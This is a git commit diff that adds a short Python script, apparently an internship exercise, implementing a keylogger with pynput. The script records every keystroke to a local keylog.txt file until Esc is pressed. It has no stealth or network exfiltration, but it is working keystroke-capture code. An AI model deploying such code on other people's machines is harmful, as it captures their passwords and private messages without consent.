5a1c86fae9e19393edb9032c0346a3012135ab91
Vishnu Suthar <sutharvishnu511@gmail.com>
2024-12-07 21:50:40 +0530

    Update Simple_Keylogger.py

--- PRODIGY_WD_04/Simple_Keylogger.py
+++ PRODIGY_WD_04/Simple_Keylogger.py
@@ -1,1 +1,28 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+# Specify the log file path
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            if hasattr(key, 'char'):  # Check if the key has a 'char' attribute
+                f.write(f"{key.char}")
+            else:
+                f.write(f" {str(key)} ")
+    except Exception as e:
+        print(f"Error: {e}")
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+# Start the listener
+try:
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+except Exception as e:
+    print(f"Error: {e}")
 
